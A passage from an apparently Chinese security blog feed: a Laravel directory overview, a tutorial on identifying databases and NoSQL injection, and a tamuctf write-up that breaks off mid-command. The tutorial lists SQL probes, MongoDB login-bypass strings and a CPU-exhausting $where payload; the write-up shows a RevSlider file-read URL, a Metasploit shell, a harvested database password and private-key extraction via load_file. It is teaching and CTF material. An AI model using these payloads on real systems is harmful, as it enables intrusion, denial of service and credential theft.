href="#以CTF题目讲解laravel目录结构" class="headerlink" title="以CTF题目讲解laravel目录结构"></a>以CTF题目讲解laravel目录结构</h3><p>具体看这里</p><blockquote><p><a href="https://www.kancloud.cn/tonyyu/laravel_5_6/786088" target="_blank" rel="noopener">https://www.kancloud.cn/tonyyu/laravel_5_6/786088</a></p></blockquote><p>就以前面lumenserial为例子，实战讲解。</p><h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p>laravel跟新换代速度非常快，有的时候目录结构变化会很大，所以我们只要理解里面蕴含的思想就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    app             核心目录（框架的核心代码在 /vendor/laravel/framework 里面</span><br><span class="line">    bootstrap       框架启动、自动加载配置（目录包含了少许文件，app.php 用于框架的启动和自动载入配置，还有一个 cache 文件夹，里面包含了框架为提升性能所生成的文件，如路由和服务缓存文件</span><br><span class="line">    config          所有文件的配置（config 目录包含了应用所有的配置文件，建议通读一遍这些配置文件以便熟悉 Laravel 所有默认配置项；</span><br><span class="line">    database        数据库相关（database 目录包含了数据库迁移文件及填充文件，如果有使用 SQLite 的话，你还可以将其作为 SQLite 数据库存放目录；</span><br><span class="line">    public          入口文件、项目静态资源文件（public 目录包含了应用入口文件 index.php 和前端资源文件（图片、JavaScript、CSS等），该目录也是 Apache 或 Nginx 等 Web 服务器所指向的应用根目录，这样做的好处是隔离了应用核心文件直接暴露于 Web 根目录之下，如果权限系统没做好或服务器配置有漏洞的话，很可能导致应用敏感文件被黑客窃取，进而对网站安全造成威胁；</span><br><span class="line">    resources       视图文件（routes 目录包含了应用定义的所有路由。Laravel 默认提供了四个路由文件用于给不同的入口使用：web.php、api.php、 console.php 和 channels.php。</span><br><span class="line"></span><br><span class="line">web.php 文件包含的路由通过 RouteServiceProvider 引入，都被约束在 web 中间件组中，因而支持 Session、CSRF 保护以及 Cookie 加密功能，如果应用无需提供无状态的、RESTful 风格的 API，那么路由基本上都要定义在 web.php 文件中。</span><br><span class="line"></span><br><span class="line">api.php 文件包含的路由通过 RouteServiceProvider 引入，都被约束在 api 中间件组中，因而支持频率限制功能，这些路由是无状态的，所以请求通过这些路由进入应用需要通过 token 进行认证并且不能访问 Session 状态。</span><br><span class="line"></span><br><span class="line">console.php 文件用于定义所有基于闭包的控制台命令，每个闭包都被绑定到一个控制台命令并且允许与命令行 IO 方法进行交互，尽管这个文件并不定义 HTTP 路由，但是它定义了基于控制台的应用入口（路由）。</span><br><span class="line"></span><br><span class="line">channels.php 文件用于注册应用支持的所有事件广播频道。</span><br><span class="line">    storage         编译后的模板文件、日志文件、缓存文件</span><br><span class="line">    tests           单元测试目录</span><br><span class="line">    vendor          composer加载的依赖文件</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/FomYZlx.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.jianshu.com/p/7c745aa026ea" target="_blank" rel="noopener">https://www.jianshu.com/p/7c745aa026ea</a><br><a href="https://pkg.phpcomposer.com/" target="_blank" rel="noopener">https://pkg.phpcomposer.com/</a><br><a href="https://blog.csdn.net/will5451/article/details/52474581" target="_blank" rel="noopener">https://blog.csdn.net/will5451/article/details/52474581</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      从零开始学习PHP框架之laravel入门
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="php框架" scheme="https://museljh.github.io/tags/php%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>SQL与Nosql注入判断以及Nosql注入入门</title>
    <link href="https://museljh.github.io/2019/03/07/SQL%E4%B8%8ENosql%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E4%BB%A5%E5%8F%8ANosql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/"/>
    <id>https://museljh.github.io/2019/03/07/SQL与Nosql注入判断以及Nosql注入入门/</id>
    <published>2019-03-07T04:24:41.000Z</published>
    <updated>2019-03-07T04:27:35.534Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然说ctf比赛中主要都是考mysql数据库，但是不可否认同样也有考其他数据库的可能性。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在当今的互联网企业中，最常用的数据库模型主要分为两种，即关系型数据库和非关系型数据库NoSQL。<br>1.常用关系型数据库<br>Oracle数据库</p><blockquote><p>主要的应用企业包括传统大企业、大公司、政府、金融、证券等</p></blockquote><p>MySQL数据库</p><blockquote><p>MySQL被广泛地应用于各大中小型网站中，具有体积小、速度快、总体拥有成本低，且开放源码等特点。</p></blockquote><p>MariaDB数据库</p><blockquote><p>MariaDB数据库管理系统是MySQL数据库的一个分支，主要由开源社区维护，采用GPL授权许可。</p></blockquote><p>SQL Server数据库<br>SQL Server的功能比较全面、效率高，可以作为中型企业或单位的数据库平台。</p><p>Access数据库</p><p>PostgreSQL数据库</p><p>2.非关系型数据库(nosql)<br>Memcached</p><blockquote><p>Memcached是一个开源的、支持高性能、高并发的分布式内存缓存系统，由C语言编写。</p></blockquote><p>redis（key-value）</p><blockquote><p>redis是一个高性能的key-value数据库</p></blockquote><p>MongoDB（document-oriented）</p><blockquote><p>MongoDB是一个介于关系型数据库和非关系型数据库之间的产品，是非关系型数据库当中功能最丰富，最像关系型数据库的一种产品。</p></blockquote><p><img src="https://i.imgur.com/IevDfzk.png" alt=""></p><h3 id="判断数据库"><a href="#判断数据库" class="headerlink" title="判断数据库"></a>判断数据库</h3><h4 id="一-关系型数据库"><a href="#一-关系型数据库" class="headerlink" title="一.关系型数据库"></a>一.关系型数据库</h4><p>1.法一</p><blockquote><p><a href="http://www.test.com/search.php?name=zhutougg" target="_blank" rel="noopener">http://www.test.com/search.php?name=zhutougg</a></p></blockquote><p>假设你已经找到了一个类似如上这样string型注入，我们可以通过利用 +、||、 等，构造如下payload（虽然我觉得这个方法没什么作用）</p><blockquote><p><a href="http://www.test.com/search.php?name=zhutou&#39;+&#39;gg" target="_blank" rel="noopener">http://www.test.com/search.php?name=zhutou&#39;+&#39;gg</a></p></blockquote><p><img src="https://i.imgur.com/HdcXZWx.png" alt=""></p><p>以mysql为例子只有，<code>select &#39;some&#39; &#39;thing&#39;</code>或者    <code>select concat(&#39;some&#39;,&#39;thing&#39;)</code> 才会得到数据，若使用其他数据库的脚本就会返回空。<br>mysql数据库使用 mysql脚本<code>select &#39;some&#39; &#39;thing&#39;</code><br><img src="https://i.imgur.com/hWNXO6K.png" alt=""></p><p>mysql数据库使用oracle脚本<code>select &#39;some&#39;||&#39;thing&#39;</code><br><img src="https://i.imgur.com/b21D4ZH.png" alt=""></p><p>其它同理。</p><p>2.法二</p><p>可以利用数据库的一些特有的返回整型结果的函数来判断数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SQLServer@@pack_received</span><br><span class="line">                @@rowcount</span><br><span class="line">MySQL        connection_id()</span><br><span class="line">                last_insert_id()</span><br><span class="line">                row_count()</span><br><span class="line">Oracle        BITAND(1,1)</span><br><span class="line">PostgreSQLselect extract(dow from now())</span><br></pre></td></tr></table></figure></p><p>同样是MySQL数据库 使用 select connection_id()<br><img src="https://i.imgur.com/kyp9GD0.png" alt=""><br>使用 select extract(dow from now())<br><img src="https://i.imgur.com/LjbXwyI.png" alt=""></p><p>法三、<br>通过某些特有的函数判断，比如SQLServer的 waitfor delay 比如PostgreSQL的pg_sleep()<br> 基于时间的<br> 在oracle之中，没有专门的内置时间函数，但是它有一个向远端服务器发送http请求的内置函数，UTL_HTTP,如果发送一个不存在的远端主机请 求，它就会尝试去连接，这样势必会造成一定程度的延迟。</p><p>在ms-sql之中，可以使用waitfor delay ‘0:0:10’注入参数之中，造成一定的延迟然后和预期的正常请求时间相比较，如果符合自己的预期，那么就可以确定数据库的类型</p><p>在mysql之中，可以使用sleep(5)注入参数之中，造成延迟来判断数据库类型</p><p>法四：</p><ul><li><p>Access:</p><p>  <code>and (select count(*) from MSysAccessObjects)&gt;0</code><br><code>and exists(select count(*) from 表)</code><br> 返回正常说明是access<br><code>ID=1 and (select count(*) from sysobjects)&gt;0</code><br>返回异常</p></li></ul><p><code>ID=1 and(select count(*) fromm sysobjects)&gt;0</code><br>返回异常</p><p><del><em> SQLserver:<br>    `and (select count(</em>) from sysobjects) &gt;0 `<br>    返回正常说明是mssql</del><br>sqlserver：<br><code>http://www.wenkuxiazai.com/showdetail.asp?id=49 and user&gt;0</code></p><p>MySQL:<br>    <code>and length(user())&gt;0</code><br>    <code>id=2 CHAR(97,110,100,32,49,61,49)</code><br>    <code>id=2 and version() &gt;0</code></p><p>返回正常说明是MySQL</p><p>ORACLE：<br><code>ID=1 and &#39;1&#39; || &#39;1&#39; = &#39;11</code></p><p><code>ID=1 and 0 &lt;&gt; (select count(*) from dual)</code></p><p><code>ID=1 CHR(97) || CHR(110) || CHR(100) || CHR(32) || CHR(49) || CHR(61) || CHR(49)</code></p><p>返回正常说明是ORACLE</p><p>MSSQL：<br><code>ID=1 and (select count(*) from sysobjects)&gt;0返回正常</code><br><code>ID=1 and (select count(*) fromm sysobjects)&gt;0返回异常</code><br><code>ID=1 and left(version(),1)=5%23//红色字体也可能是4</code><br><code>ID=1 and exists(select id from sysobjects)</code><br><code>ID=1 and length(user)&gt;0</code><br><code>ID=1 CHAR(97) +CHAR(110) +CHAR(100) +CHAR(32) +CHAR(49) +CHAR(61) +CHAR(49)</code></p><p>法五：<br>其实我们还可以利用数据库的注释符来判断<br><img src="https://i.imgur.com/6aXuFuH.png" alt=""></p><h4 id="二、非关系型数据库"><a href="#二、非关系型数据库" class="headerlink" title="二、非关系型数据库"></a>二、非关系型数据库</h4><p>如何识别数据库使用的是nosql数据库呢？<br>法一：<br>使用nosqlmap或者nosqlattack等自动化工具<br>法二：直接使用针对于nosql的常见注入脚本<br>法三：根据情况判断。比如网站有信息泄露之类的。</p><p>NoSQL(NoSQL = Not Only SQL )，意即”不仅仅是SQL”。<br>使用比较多的Nosql数据库为MongoDB，Nosql在查询的时候采用BSON类型数据，有别于传统的json数据<br>我们先讲解下什么是Bson数据</p><p>那BSON是个啥？BSON Spec官方是这样描述的：<br>BSON（Binary Serialized Document Format）, short for Bin­ary JSON, is a bin­ary-en­coded seri­al­iz­a­tion of JSON-like doc­u­ments.</p><p>举个栗子：<br>json数据</p><blockquote><p>{ “key”: “value” }</p></blockquote><p>将它转换成BSON数据：</p><blockquote><p> 0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5<br>+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+<br>|14 00 00 00|02|6b 65 79 00|06 00 00 00 76 61 6c|<br>+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+<br>|75 65 00|00|<br>+–+–+–+–+</p></blockquote><p>大概就是json的摘要，类似于将json二进制数据进行序列化<br>感兴趣的可以看</p><blockquote><p><a href="http://liehu.tass.com.cn/archives/1294" target="_blank" rel="noopener">http://liehu.tass.com.cn/archives/1294</a></p></blockquote><p>其实这么一看好像nosql安全性挺高的，然而却不是这样，为了保持高速的访问，nosql有着许多安全问题。</p><p>主要问题有Nosql未授权访问。<br>PHP:<br>1.以查询条件{ “password”: @USER_INPUT }为例，在不知道密码的情况下，可以使用{ “password”: { “$ne”: 1 } }绕过。</p><p>2.永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制，主要造成这个原因是由于MongoDB之类的nosql数据库对用户输入没有做任何校验，<br>感兴趣可以看</p><blockquote><p><a href="https://www.anquanke.com/post/id/97211" target="_blank" rel="noopener">https://www.anquanke.com/post/id/97211</a></p></blockquote><p>以登入界面为例子，直接使用以下payload便可以直接登入。<br>payload:<br><code>username[$ne]=1&amp;password[$ne]=1</code></p><p>感觉这个和未授权访问貌似讲的是同会事<br>3.NoSQL联合查询注入</p><p>string query =”{ username: ‘“ + post_username + “‘, password: ‘“ + post_password + “‘ }”</p><p>payload:</p><p>username=tolkien’, $or: [ {}, { ‘a’:’a&amp;password=’ } ]</p><p>JavaScript:<br>在MongoDB中 $where操作符是可以执行JavaScript语句的<br>payload</p><blockquote><p>username=1&amp;password=1;return true;</p></blockquote><blockquote><p>username=1&amp;password=1;(function(){var%20date%20=%20new%20Date();%20do{curDate%20=%20new%20Date();}while(curDate-date%3C5000);%20return%20Math.max();})();</p></blockquote><p>这个payload可以让MongoDB所在服务器CPU瞬间飙升，持续5秒。<br>5.Node.js中的NoSQL注入<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125;</span><br></pre></td></tr></table></figure><p>其实就是把它数据变成json。<br>靶场</p><blockquote><p><a href="https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035" target="_blank" rel="noopener">https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035</a></p></blockquote><p>wp</p><blockquote><p><a href="https://www.anquanke.com/post/id/95844" target="_blank" rel="noopener">https://www.anquanke.com/post/id/95844</a></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.jianshu.com/p/80d7e16c0185" target="_blank" rel="noopener">https://www.jianshu.com/p/80d7e16c0185</a><br><a href="https://db-engines.com/en/ranking" target="_blank" rel="noopener">https://db-engines.com/en/ranking</a><br><a href="https://www.jianshu.com/p/995f57e36918" target="_blank" rel="noopener">https://www.jianshu.com/p/995f57e36918</a><br><a href="https://wsygoogol.github.io/2016/06/18/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/" target="_blank" rel="noopener">https://wsygoogol.github.io/2016/06/18/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/</a><br><a href="https://www.jianshu.com/p/995f57e36918" target="_blank" rel="noopener">https://www.jianshu.com/p/995f57e36918</a><br><a href="https://www.bugbank.cn/q/article/59899f4b9a4253dc14efe543.html" target="_blank" rel="noopener">https://www.bugbank.cn/q/article/59899f4b9a4253dc14efe543.html</a><br><a href="https://xz.aliyun.com/t/2075" target="_blank" rel="noopener">https://xz.aliyun.com/t/2075</a><br><a href="https://www.anquanke.com/post/id/97211" target="_blank" rel="noopener">https://www.anquanke.com/post/id/97211</a><br><a href="http://liehu.tass.com.cn/archives/1294" target="_blank" rel="noopener">http://liehu.tass.com.cn/archives/1294</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      SQL与Nosql注入判断以及Nosql注入入门。
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="sql注入" scheme="https://museljh.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>从tamuctf Network中学习内网渗透</title>
    <link href="https://museljh.github.io/2019/03/06/tamuctf%20Network%E9%83%A8%E5%88%86wp/"/>
    <id>https://museljh.github.io/2019/03/06/tamuctf Network部分wp/</id>
    <published>2019-03-06T14:21:24.000Z</published>
    <updated>2019-03-06T15:07:20.390Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个是tamuctf内网穿透的题目,话说tamuctf居然是一个校赛…</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>环境搭建</p><blockquote><p>apt install openvpn</p></blockquote><blockquote><p>openvpn –config ${challenge}.ovpn<br>这里的${challenge}是指具体文件名字</p></blockquote><h3 id="Stop-and-Listen"><a href="#Stop-and-Listen" class="headerlink" title="Stop and Listen"></a>Stop and Listen</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Sometimes you just need to stop and listen.</span><br><span class="line"></span><br><span class="line">This challenge is an introduction to our network exploit challenges, which are hosted over OpenVPN.</span><br><span class="line"></span><br><span class="line">Instructions:</span><br><span class="line"></span><br><span class="line">Install OpenVPN. Make sure to install the TAP driver.</span><br><span class="line">Debian (Ubuntu/Kali) linux CLI: apt install openvpn</span><br><span class="line">Windows GUI installer</span><br><span class="line">Obtain your OpenVPN configuration in the challenge modal.</span><br><span class="line">You will obtain a separate config for each challenge containing connection info and certificates for authentication.</span><br><span class="line">Launch OpenVPN:</span><br><span class="line">CLI: sudo openvpn --config $&#123;challenge&#125;.ovpn</span><br><span class="line">Windows GUI: Place the config file in %HOMEPATH%\OpenVPN\config and right-click the VPN icon on the status bar, then select the config for this challenge</span><br><span class="line">The virtual tap0 interface will be assigned the IP address 172.30.0.14/28 by default. If multiple team members connect you will need to choose a unique IP for both.</span><br><span class="line"></span><br><span class="line">The standard subnet is 172.30.0.0/28, so give that a scan ;)</span><br><span class="line"></span><br><span class="line">If you have any issues, please let me (nategraf) know in the Discord chat</span><br><span class="line"></span><br><span class="line">Some tools to get started:</span><br><span class="line"></span><br><span class="line">Wireshark</span><br><span class="line">tcpdump</span><br><span class="line">nmap</span><br><span class="line">ettercap</span><br><span class="line">betterca</span><br></pre></td></tr></table></figure><p>The standard subnet is 172.30.0.0/28, so give that a scan ;<br>根据题目提示我们首先</p><blockquote><p>nmap -vvv 172.30.0.0/28</p></blockquote><p>并没有发现什么可疑的端口<br>根据题目提示使用wireshark进行流量分析，先在服务器进行流量抓取</p><blockquote><p>tcpdump -i tap0 -w listen.pcay</p></blockquote><p>耐心等会<br><img src="https://i.imgur.com/eoDJD1G.png" alt=""></p><h2 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">I setup my own Wordpress site!</span><br><span class="line">I love that there are so many plugins. My favorite is Revolution Slider. Even though it&apos;s a little old it doesn&apos;t show up on wpscan!</span><br><span class="line"></span><br><span class="line">Please give it about 30 seconds after connecting for everything to setup correctly.</span><br><span class="line">The flag is in /root/flag.txt</span><br><span class="line"></span><br><span class="line">Difficulty: medium</span><br></pre></td></tr></table></figure><p>根据题目提示<br>应该是wordpress的某个插件出现问题</p><blockquote><p>My favorite is Revolution Slider， Even though it’s a little old it doesn’t show up on wpscan</p></blockquote><p>wpscan是wordpress的专门扫描器，题目虽然说用wpscan扫不出但是，估计就是这个Revolution Slider有问题了。</p><p>并且flag  在 /root/flag.txt中<br>我们再次</p><blockquote><p>openvpn –config wordpress.ovpn </p></blockquote><p>依旧nmap 一波</p><blockquote><p>nmap -vvv 172.30.0.0/28</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 172.30.0.2</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">3306/tcp open  mysql   syn-ack ttl 64</span><br><span class="line">MAC Address: 02:42:3D:35:F3:46 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.30.0.3</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 64</span><br><span class="line">80/tcp open  http    syn-ack ttl 64</span><br><span class="line">MAC Address: 02:42:2E:E8:F8:89 (Unknown)</span><br></pre></td></tr></table></figure><p>可以知道172.30.0.3的80端口有开，我们使用wpscan扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm wpscanteam/wpscan --url 172.30.0.3 --enumerate</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[+] revslider</span><br><span class="line"> | Location: http://172.30.0.3/wp-content/plugins/revslider/</span><br><span class="line"> |</span><br><span class="line"> | Detected By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 2 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress Slider Revolution Local File Disclosure</span><br><span class="line"> |     Fixed in: 4.1.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/7540</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/34511/</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/36039/</span><br><span class="line"> |      - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html</span><br><span class="line"> |      - http://packetstormsecurity.com/files/129761/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress Slider Revolution Shell Upload</span><br><span class="line"> |     Fixed in: 3.0.96</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/7954</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/35385/</span><br><span class="line"> |      - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/</span><br><span class="line"> |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_revslider_upload_execute</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br></pre></td></tr></table></figure><p>有两个攻击点，先看看第一个</p><blockquote><p><a href="https://www.exploit-db.com/exploits/34511" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/34511</a></p></blockquote><p>漏洞是这么形容的</p><blockquote><p>Mulitple WordPress Themes - ‘admin-ajax.php?img’ Arbitrary File Download</p></blockquote><p>意思为这个漏洞为任意文件下载漏洞，给出了POP链</p><p>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://victim/wp-admin/admin-ajax.php?action=revslider_show_image&amp;img=../wp-config.php</span><br></pre></td></tr></table></figure></p><p>我们试试能不能读取文件。尝试了下不可以，因该是权限不足的原因。</p><p>试试第二个，使用msf</p><p><img src="https://i.imgur.com/n7ScENE.png" alt=""></p><p>其实并不用这么麻烦的，这里只是介绍下wpscan其实一开始就给我们说了<br><img src="https://i.imgur.com/p5YVike.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search wp_revslider_upload_execute</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                             Disclosure Date  Rank       Check  Description</span><br><span class="line">   ----                                             ---------------  ----       -----  -----------</span><br><span class="line">   exploit/unix/webapp/wp_revslider_upload_execute  2014-11-26       excellent  Yes    WordPress RevSlider File Upload and Execute Vulnerability</span><br></pre></td></tr></table></figure><p>所以msf直接search Revolution就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search Revolution</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                             Disclosure Date  Rank       Check  Description</span><br><span class="line">   ----                                             ---------------  ----       -----  -----------</span><br><span class="line">   exploit/unix/webapp/wp_revslider_upload_execute  2014-11-26       excellent  Yes    WordPress RevSlider File Upload and Execute Vulnerability</span><br></pre></td></tr></table></figure><p>其实是达到了相同的效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use unix/webapp/wp_revslider_upload_execute</span><br><span class="line">msf5 exploit(unix/webapp/wp_revslider_upload_execute) &gt; set RHOSTS 172.30.0.3</span><br><span class="line">RHOSTS =&gt; 172.30.0.3</span><br><span class="line">msf5 exploit(unix/webapp/wp_revslider_upload_execute) &gt; exploit</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure><p>我们成功得到一个shell</p><p>读取下flag<br>发现权限不足<br><img src="https://i.imgur.com/IrEYXKp.png" alt=""></p><p>ls下发现目录里note.txt很可疑<br><img src="https://i.imgur.com/WkPYCw5.png" alt=""><br>cat 以下 发现<br><img src="https://i.imgur.com/kL8cTVa.png" alt=""><br>意思是要我们去数据库中获取ssh密钥</p><p>我们再看下当前目录，尝试下cat wp-config.php</p><p>然后发现数据库信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(&apos;DB_USER&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&apos;DB_PASSWORD&apos;, &apos;0NYa6PBH52y86C&apos;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 172.30.0.2 -u wordpress --password=&quot;0NYa6PBH52y86C&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;/backup/id_rsa&apos;);</span><br><span class="line">[...]</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>创建一个rsa.key文件，并给他一定权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~# touch rsa.key</span><br><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~# vim rsa.key</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~# chmod 400 rsa.key </span><br><span 